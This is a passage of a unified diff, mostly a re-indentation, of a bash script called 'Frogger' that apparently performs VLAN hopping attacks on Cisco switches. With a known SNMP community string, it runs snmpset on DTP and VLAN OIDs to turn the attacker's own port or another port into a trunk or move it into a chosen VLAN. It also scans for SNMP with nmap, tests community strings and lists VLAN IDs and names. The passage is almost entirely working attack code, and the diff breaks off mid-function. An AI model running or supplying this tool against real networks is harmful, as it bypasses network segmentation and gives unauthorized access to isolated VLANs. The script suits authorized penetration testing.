+  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
+  esac
+  }
 
-show_menusattackselfsnmpordtp() {
-printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------"
-printf '\r%s %s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Make TRUNK port or manual specify VLAN ID for your port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} ?"
-printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------------------${NORMAL}"
-printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Make my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} a TRUNK (access all VLANs)"
-printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Enter single VLAN ID on my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} (specific VLAN access)"
-printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
-}
+  show_menusattackselfsnmpordtp() {
+  printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------"
+  printf '\r%s %s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Make TRUNK port or manual specify VLAN ID for your port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} ?"
+  printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------------------${NORMAL}"
+  printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Make my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} a TRUNK (access all VLANs)"
+  printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Enter single VLAN ID on my own port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} (specific VLAN access)"
+  printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
+  }
 
-read_optionattackselfsnmpordtp() {
-TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
-local choice
-read -p "$TXT" choice
-case $choice in
-1) dtpvlanin ; dtpattackextract ;;
-2) snmphopvlanin ;;
-3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
-*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
-esac
-}
+  read_optionattackselfsnmpordtp() {
+  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
+  local choice
+  read -p "$TXT" choice
+  case $choice in
+  1) dtpvlanin ; dtpattackextract ;;
+  2) snmphopvlanin ;;
+  3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
+  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
+  esac
+  }
 
-show_menusattackothersnmpordtp() {
-printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------------"
-printf '\r%s %s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Make TRUNK port or manual specify VLAN ID for another port on device?"
-printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------------------------${NORMAL}"
-printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Make another port a TRUNK (access all VLANs)"
-printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Enter single VLAN ID on another port (specific VLAN access)"
-printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
-}
+  show_menusattackothersnmpordtp() {
+  printf '\n\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------------"
+  printf '\r%s %s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "Make TRUNK port or manual specify VLAN ID for another port on device?"
+  printf '\r%s\n\n' "${BRIGHT}${RED}----------------------------------------------------------------------------${NORMAL}"
+  printf '\r%s \n\n' "${GREEN}[1]${NORMAL} - Make another port a TRUNK (access all VLANs)"
+  printf '\r%s \n\n' "${YELLOW}[2]${NORMAL} - Enter single VLAN ID on another port (specific VLAN access)"
+  printf '\r%s \n\n' "${RED}[3]${NORMAL} - Exit the Script"
+  }
 
-read_optionattackothersnmpordtp() {
-TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
-local choice
-read -p "$TXT" choice
-case $choice in
-1) dtpvlaninwhichport ;;
-2) snmphopvlaninwhichport ;;
-3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
-*) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
-esac
-}
+  read_optionattackothersnmpordtp() {
+  TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 3 ]${NORMAL}")
+  local choice
+  read -p "$TXT" choice
+  case $choice in
+  1) dtpvlaninwhichport ;;
+  2) snmphopvlaninwhichport ;;
+  3) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
+  *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
+  esac
+  }
 
-show_menusattackselforother
-read_optionattackselforother
+  show_menusattackselforother
+  read_optionattackselforother
 
 }
 
 snmphopvlanin() {
-YOURPORT3=$(cat yourport.tmp)
+  YOURPORT3=$(cat yourport.tmp)
 
-printf '\n\r%s\n' "${BRIGHT}${RED}-------------------------------------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} What VLAN would like you to be in? Enter the ID number and press Enter"
-printf '\r%s\n\n' "${BRIGHT}${RED}-------------------------------------------------------------------------------------${NORMAL}"
-read WHATVLANIN
-#make/ensure it is an access port (otherwise will fail on some switches)
-snmpset -v $SNMPVER -Cq -c $SNMPCOM $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13.""$YOURPORT3" i 2 2>/dev/null
-sleep 2
-snmpset -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.68.1.2.2.1.2.""$YOURPORT3" i "$WHATVLANIN" 2>/dev/null
-printf '\n\n'
-		SECONDS=0;
-		while sleep .5 && ((SECONDS <= 5)); do
-			printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now sleeping for" "$((5-SECONDS))" "seconds whilst port state changes happen."
-		done
-		printf '\n\n'
-sleep 3
-printf '\r%s %s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Your port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} should now be in VLAN ${BRIGHT}${GREEN}"$WHATVLANIN"${NORMAL}"
+  printf '\n\r%s\n' "${BRIGHT}${RED}-------------------------------------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} What VLAN would like you to be in? Enter the ID number and press Enter"
+  printf '\r%s\n\n' "${BRIGHT}${RED}-------------------------------------------------------------------------------------${NORMAL}"
+  read WHATVLANIN
+  #make/ensure it is an access port (otherwise will fail on some switches)
+  snmpset -v $SNMPVER -Cq -c $SNMPCOM $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13.""$YOURPORT3" i 2 2>/dev/null
+  sleep 2
+  snmpset -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.68.1.2.2.1.2.""$YOURPORT3" i "$WHATVLANIN" 2>/dev/null
+  printf '\n\n'
+      SECONDS=0;
+      while sleep .5 && ((SECONDS <= 5)); do
+        printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now sleeping for" "$((5-SECONDS))" "seconds whilst port state changes happen."
+      done
+      printf '\n\n'
+  sleep 3
+  printf '\r%s %s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Your port ${BRIGHT}${GREEN}"$YOURPORT3"${NORMAL} should now be in VLAN ${BRIGHT}${GREEN}"$WHATVLANIN"${NORMAL}"
 }
 
-dtpvlanin () {
-# when port is not in VLAN one you need to use comstring@vlanid i.e $SNMPCOM@50 is for vlan 50 using $SNMPCOM.
-YOURPORTMOD=$(cat yourport.tmp)
-LISTDTPMODES="1.3.6.1.4.1.9.9.46.1.6.1.1.13"
-MANLANINFO="1.3.6.1.4.1.9.9.46.1.2"
-WALKDTPMODES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP $LISTDTPMODES 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" 2>/dev/null)
-WHATDTP=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP $LISTDTPMODES 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" 2>/dev/null |grep "13.$YOURPORTMOD = " |cut -d "=" -f 2 |awk '{sub(/^[ \t]+/, ""); print}')
+  dtpvlanin () {
+  # when port is not in VLAN one you need to use comstring@vlanid i.e $SNMPCOM@50 is for vlan 50 using $SNMPCOM.
+  YOURPORTMOD=$(cat yourport.tmp)
+  LISTDTPMODES="1.3.6.1.4.1.9.9.46.1.6.1.1.13"
+  MANLANINFO="1.3.6.1.4.1.9.9.46.1.2"
+  WALKDTPMODES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP $LISTDTPMODES 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" 2>/dev/null)
+  WHATDTP=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP $LISTDTPMODES 2>&1 |sed -e "s/INTEGER: 1/${DTP1}/g" |sed -e "s/INTEGER: 2/${DTP2}/g" |sed -e "s/INTEGER: 3/${DTP3}/g"  | sed -e "s/INTEGER: 4/${DTP4}/g" |sed -e "s/INTEGER: 5/${DTP5}/g" 2>/dev/null |grep "13.$YOURPORTMOD = " |cut -d "=" -f 2 |awk '{sub(/^[ \t]+/, ""); print}')
 
-if [ "$WHATDTP" != "$DTP5" ]
-	then
-		printf '\n\n'
-		printf '\r%s %s\n' "${BRIGHT}${BLUE}[i]${NORMAL} Enabling DTP TRUNK on port ${BRIGHT}${GREEN}"$YOURPORTMOD"${NORMAL}"
-		#set to trunk port INTEG 1
-		snmpset -v $SNMPVER -Cq -c "$SNMPCOM" "$IP" "$LISTDTPMODES"."$YOURPORTMOD" i 1 >/dev/null 2>&1
-		printf '\n'
-		SECONDS=0;
-		while sleep .5 && ((SECONDS <= 25)); do
-			printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now sleeping for" "$((25-SECONDS))" "seconds whilst port state changes happen."
-		done
-		printf '\n\n'
-else
-		printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} It seems your port ${BRIGHT}${GREEN}"$YOURPORTMOD"${NORMAL} is already a trunk port, no need to run any DTP attacks!"
-		sourceinterfaces
-		dtpattackextract
-fi
+  if [ "$WHATDTP" != "$DTP5" ]
+    then
+      printf '\n\n'
+      printf '\r%s %s\n' "${BRIGHT}${BLUE}[i]${NORMAL} Enabling DTP TRUNK on port ${BRIGHT}${GREEN}"$YOURPORTMOD"${NORMAL}"
+      #set to trunk port INTEG 1
+      snmpset -v $SNMPVER -Cq -c "$SNMPCOM" "$IP" "$LISTDTPMODES"."$YOURPORTMOD" i 1 >/dev/null 2>&1
+      printf '\n'
+      SECONDS=0;
+      while sleep .5 && ((SECONDS <= 25)); do
+        printf '\r%s %s %2d %s' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now sleeping for" "$((25-SECONDS))" "seconds whilst port state changes happen."
+      done
+      printf '\n\n'
+  else
+      printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} It seems your port ${BRIGHT}${GREEN}"$YOURPORTMOD"${NORMAL} is already a trunk port, no need to run any DTP attacks!"
+      sourceinterfaces
+      dtpattackextract
+  fi
 }
 
 dtpvlanwhichportset(){
 
-printf '\n\n'
-printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Enabling DTP TRUNK on port ${BRIGHT}${GREEN}"$PORTNUMDTP"${NORMAL}"
-#set to trunk port INTEG 1
-snmpset -v $SNMPVER -Cq -c "$SNMPCOM" "$IP" "$LISTDTPMODES"."$PORTNUMDTP" i 1 >/dev/null 2>&1
-sleep 5
-printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Port ${BRIGHT}${GREEN}"$PORTNUMDTP"${NORMAL} should now be a TRUNK port."
-		
+  printf '\n\n'
+  printf '\r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Enabling DTP TRUNK on port ${BRIGHT}${GREEN}"$PORTNUMDTP"${NORMAL}"
+  #set to trunk port INTEG 1
+  snmpset -v $SNMPVER -Cq -c "$SNMPCOM" "$IP" "$LISTDTPMODES"."$PORTNUMDTP" i 1 >/dev/null 2>&1
+  sleep 5
+  printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Port ${BRIGHT}${GREEN}"$PORTNUMDTP"${NORMAL} should now be a TRUNK port."
+
 }
 
 dtpvlaninwhichport () {
+  YOURPORTMOD=$(cat yourport.tmp)
+  LISTDTPMODES="1.3.6.1.4.1.9.9.46.1.6.1.1.13"
+  printf '\n\r%s\n' "${BRIGHT}${RED}---------------------------------------------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the port number from the list below to set the port to a trunk and press ENTER"
+  printf '\r%s\n' "${BRIGHT}${RED}---------------------------------------------------------------------------------------------${NORMAL}"
 
-YOURPORTMOD=$(cat yourport.tmp)
-LISTDTPMODES="1.3.6.1.4.1.9.9.46.1.6.1.1.13"
-printf '\n\r%s\n' "${BRIGHT}${RED}---------------------------------------------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the port number from the list below to set the port to a trunk and press ENTER"
-printf '\r%s\n' "${BRIGHT}${RED}---------------------------------------------------------------------------------------------${NORMAL}"
-		
-snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' >listports.tmp
+  snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' >listports.tmp
 
-LISTPORTS=$(cat listports.tmp)
-printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTPORTS${NORMAL}"
+  LISTPORTS=$(cat listports.tmp)
+  printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTPORTS${NORMAL}"
 
-read PORTNUMDTP
+  read PORTNUMDTP
 
-cat listports.tmp | grep -o -w "$PORTNUMDTP" >/dev/null 2>&1
-if [ $? != 0 ]
-	then
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "That port number does exist, try again."
-		dtpvlaninwhichport
-	else
-		dtpvlanwhichportset
-fi
-
+  cat listports.tmp | grep -o -w "$PORTNUMDTP" >/dev/null 2>&1
+  if [ $? != 0 ]
+    then
+      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "That port number does exist, try again."
+      dtpvlaninwhichport
+    else
+      dtpvlanwhichportset
+  fi
 }
 
 snmphopvlaninwhichportset(){
-printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------"
-printf '\r%s %s\n' "${BRIGHT}${RED}[?]${NORMAL} Which VLAN ID number do you want to move port ${BRIGHT}${GREEN}$SNMPPORTNUMIN${NORMAL} into? enter number and press ENTER"
-printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------${NORMAL}"
+  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------"
+  printf '\r%s %s\n' "${BRIGHT}${RED}[?]${NORMAL} Which VLAN ID number do you want to move port ${BRIGHT}${GREEN}$SNMPPORTNUMIN${NORMAL} into? enter number and press ENTER"
+  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------------------------------------------${NORMAL}"
 
-read SNMPVLANIN
-printf '\n\n'
-#make/ensure it is an access port (otherwise will fail on some switches)
-snmpset -v $SNMPVER -Cq -c $SNMPCOM $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13.""$SNMPPORTNUMIN" i 2 2>/dev/null
-sleep 2
-snmpset -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.4.1.9.9.68.1.2.2.1.2.$SNMPPORTNUMIN i $SNMPVLANIN >/dev/null 2>&1
-printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Port ${BRIGHT}${GREEN}"$SNMPPORTNUMIN"${NORMAL} should now be in VLAN ${BRIGHT}${GREEN}"$SNMPVLANIN"${NORMAL}."
-	
+  read SNMPVLANIN
+  printf '\n\n'
+  #make/ensure it is an access port (otherwise will fail on some switches)
+  snmpset -v $SNMPVER -Cq -c $SNMPCOM $IP "1.3.6.1.4.1.9.9.46.1.6.1.1.13.""$SNMPPORTNUMIN" i 2 2>/dev/null
+  sleep 2
+  snmpset -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.4.1.9.9.68.1.2.2.1.2.$SNMPPORTNUMIN i $SNMPVLANIN >/dev/null 2>&1
+  printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Port ${BRIGHT}${GREEN}"$SNMPPORTNUMIN"${NORMAL} should now be in VLAN ${BRIGHT}${GREEN}"$SNMPVLANIN"${NORMAL}."
 }
 snmphopvlaninwhichport() {
-printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the port number from the list below to change the port VLAN press ENTER"
-printf '\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------${NORMAL}"
-		
-snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' >listports.tmp
+  printf '\n\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the port number from the list below to change the port VLAN press ENTER"
+  printf '\r%s\n' "${BRIGHT}${RED}------------------------------------------------------------------------------------${NORMAL}"
 
-LISTPORTS=$(cat listports.tmp)
-printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTPORTS${NORMAL}"
-read SNMPPORTNUMIN
+  snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.2.2.1.1 2>&1 |awk '{print $NF}' >listports.tmp
 
-cat listports.tmp | grep -o -w "$SNMPPORTNUMIN" >/dev/null 2>&1
-if [ $? != 0 ]
-	then
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "That port number does exist, try again."
-		snmphopvlaninwhichport
-	else
-		snmphopvlaninwhichportset
-fi
+  LISTPORTS=$(cat listports.tmp)
+  printf '\r%s\n\n' "${BRIGHT}${GREEN}$LISTPORTS${NORMAL}"
+  read SNMPPORTNUMIN
 
+  cat listports.tmp | grep -o -w "$SNMPPORTNUMIN" >/dev/null 2>&1
+  if [ $? != 0 ]
+    then
+      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "That port number does exist, try again."
+      snmphopvlaninwhichport
+    else
+      snmphopvlaninwhichportset
+  fi
 }
 
-
-#attack menu
-
+### attack menu
 if [ -n "$READW" ]
 	then
 		attackselforotherchoice
@@ -624,198 +619,189 @@ if [ -n "$READW" ]
 		dtplistmodes
 fi
 }
-#snmpvlanattack function end
 
-#snmpextract (read only) function start.
+# snmpvlanattack function end
+
+# snmpextract (read only) function start.
 snmpextractro(){
-
-printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the device and press ENTER"
-printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------${NORMAL}"
-read IP
-echo $IP | egrep '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'  >/dev/null 2>&1
-if [ $? != 0 ]
-	then
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "You entered an invalid IP address format."
-		snmpvlanattack
-	else
-		snmpextractrorun
-fi
+  printf '\n\r%s\n' "${BRIGHT}${RED}--------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the IP address of the device and press ENTER"
+  printf '\r%s\n\n' "${BRIGHT}${RED}--------------------------------------------------------${NORMAL}"
+  read IP
+  echo $IP | egrep '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'  >/dev/null 2>&1
+  if [ $? != 0 ]
+    then
+      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "You entered an invalid IP address format."
+      snmpvlanattack
+    else
+      snmpextractrorun
+  fi
 }
 
 snmpextractrorun() {
-MYMAC=$(ip addr |grep link/ether | awk '{print $2}' |sort -u |tr ':' ' ')
+  MYMAC=$(ip addr |grep link/ether | awk '{print $2}' |sort -u |tr ':' ' ')
 
-printf '\n\r%s\n' "${BRIGHT}${RED}-------------------------------------------------------"
-printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the SNMP community string and press ENTER"
-printf '\r%s\n\n' "${BRIGHT}${RED}-------------------------------------------------------${NORMAL}"
-read SNMPCOM
+  printf '\n\r%s\n' "${BRIGHT}${RED}-------------------------------------------------------"
+  printf '\r%s\n' "${BRIGHT}${RED}[?]${NORMAL} Enter the SNMP community string and press ENTER"
+  printf '\r%s\n\n' "${BRIGHT}${RED}-------------------------------------------------------${NORMAL}"
+  read SNMPCOM
 
+  # nmap to check SNMP is open
+  nmapsnmpro() {
+    NMAP=`nmap -sU -sV -p $PORT $IP -n -Pn 2>&1 |grep "open" | awk '{ print $2 }'`
+    if [ "$NMAP" = "open" ]
+      then
+        printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "SNMP was found enabled on ${BRIGHT}${GREEN}"$IP"${NORMAL}"
+      else
+        printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP is either closed or filtered from this device. Check connectivity and try again. Script can't continue."
+        #remove tmp files
+        rm *.tmp 2>/dev/null
+        exit 1
+    fi
+  }
 
-# nmap to check SNMP is open
-nmapsnmpro() {
-NMAP=`nmap -sU -sV -p $PORT $IP -n -Pn 2>&1 |grep "open" | awk '{ print $2 }'`
-if [ "$NMAP" = "open" ]
-	then
-		printf '\r\n%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "SNMP was found enabled on ${BRIGHT}${GREEN}"$IP"${NORMAL}"
-	else
-		printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP is either closed or filtered from this device. Check connectivity and try again. Script can't continue."
-		#remove tmp files
-		rm *.tmp 2>/dev/null
-		exit 1
-fi
-}
+  # SNMP community string checks
+  scansnmpcomro() {
+    printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP community with ${BRIGHT}${GREEN}"$SNMPCOM"${NORMAL} string."
 
-# SNMP community string checks
-scansnmpcomro() {
-printf '\r\n%s %s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL}" "Now testing SNMP community with ${BRIGHT}${GREEN}"$SNMPCOM"${NORMAL} string."
+    snmpwalk -t 0.5 -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1
 
-snmpwalk -t 0.5 -c $SNMPCOM -v $SNMPVER $IP 1.3.6.1.2.1.1.1.0 >/dev/null 2>&1
+    if [ $? != "0" ]
+      then
+      printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP community name of "$SNMPCOM" did not work, or this is not a Cisco device."
+        #remove tmp files
+        rm *.tmp 2>/dev/null
+        exit 1
 
-if [ $? != "0" ]
-	then
-	printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "SNMP community name of "$SNMPCOM" did not work, or this is not a Cisco device."
-		#remove tmp files
-		rm *.tmp 2>/dev/null
-		exit 1
+    fi
 
-fi
+    COMSCAN="$SNMPCOM"
 
-COMSCAN="$SNMPCOM"
+      snmpwalk -v $SNMPVER -c $COMSCAN $IP 2>/dev/null |head -1 |grep -i iso >/dev/null
+      if [ $? = 0 ]
+        then
+          printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}"
+          GETLOCATION=$(snmpwalk -v $SNMPVER -On -c "$COMSCAN" $IP "$WRITEOID" 2>&1 |cut -d ":" -f 2 | cut -d '"' -f 2)
+      fi
+  }
 
-	snmpwalk -v $SNMPVER -c $COMSCAN $IP 2>/dev/null |head -1 |grep -i iso >/dev/null
-	if [ $? = 0 ]
-		then
-			printf '\r%s %s \n' "${BRIGHT}${GREEN}[+]${NORMAL}" "Valid Community String was found ${BRIGHT}${GREEN}"$COMSCAN"${NORMAL}" 
-			GETLOCATION=$(snmpwalk -v $SNMPVER -On -c "$COMSCAN" $IP "$WRITEOID" 2>&1 |cut -d ":" -f 2 | cut -d '"' -f 2)
-	fi
-}
+  #alter port numbers if different switch models into 10001 format.
+  alterportint() {
+    PORTSIZE=$(cat yourport.tmp |wc -L)
 
-#alter port numbers if different switch models into 10001 format.
-alterportint() {
+    if [ "$PORTSIZE" = "1" ]
+     then
+            sed -i -e 's/^/1000/' yourport.tmp
+    elif [ "$PORTSIZE" = "2" ]
+      then
+        sed -i -e 's/^/100/' yourport.tmp
+    else
+            sed -i -e 's/^/10/' yourport.tmp
+    fi
+  }
 
-PORTSIZE=$(cat yourport.tmp |wc -L)
+  vlanextractro() {
+    printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Extracting all Read-Only VLAN Information, please wait"
 
-if [ "$PORTSIZE" = "1" ]
- then
-        sed -i -e 's/^/1000/' yourport.tmp
-elif [ "$PORTSIZE" = "2" ]
-  then
-		sed -i -e 's/^/100/' yourport.tmp
-else
-        sed -i -e 's/^/10/' yourport.tmp
+    VLANIDS=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $1}' | cut -d "." -f 16 >ids.tmp)
+    VLANNAMES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $NF}' |sed 's/"//g' >names.tmp)
 
-fi
-}
+    COUNTVLANS=$(cat ids.tmp |wc -l)
 
-vlanextractro() {
-printf '\r\n%s \n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Extracting all Read-Only VLAN Information, please wait"
+    if [ "$COUNTVLANS" = 0 ]
+      then
+        printf '\r\n%s %s \n\n' "${BRIGHT}${RED}[!]${NORMAL}" "No VLANs were found on this device, it is likely this device does not VLANs at all"
+        #remove tmp files
+        rm *.tmp 2>/dev/null
+        exit 1
+    else
+      printf '\r%s %s \n\n' "${BRIGHT}${GREEN}[+]${NORMAL}" "There are ${BRIGHT}${GREEN}"$COUNTVLANS"${NORMAL} VLANs configured on this device."
 
-VLANIDS=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $1}' | cut -d "." -f 16 >ids.tmp)
-VLANNAMES=$(snmpwalk -c $SNMPCOM -v $SNMPVER $IP "1.3.6.1.4.1.9.9.46.1.3" 2>&1 |grep 'STRING: "' |awk '{print $NF}' |sed 's/"//g' >names.tmp)
+      paste ids.tmp names.tmp |column -t 2>&1 >idsnames.tmp
+      IDNAMES=$(cat idsnames.tmp)
+      printf '\r%s \n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+      printf '\r%s\n' "${BRIGHT}${GREEN}$IDNAMES${NORMAL}"
+      printf '\r%s \n\n' "${BRIGHT}${GREEN}-----------------------------------------------${NORMAL}"
+    fi
+    FINDMYPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.1 2>&1 |grep -i "$MYMAC" |awk '{print $NR}' |cut -d "." -f 13-20)
+    YOURPORT=$(snmpwalk -On -c $SNMPCOM -v $SNMPVER $IP .1.3.6.1.2.1.17.4.3.1.2 2>&1 |grep "$FINDMYPORT" |awk '{print $NF}'|sort -u)
 
-COUNTVLANS=$(cat ids.tmp |wc -l)
+    if [ "$YOURPORT" != "OID" ]
+      then
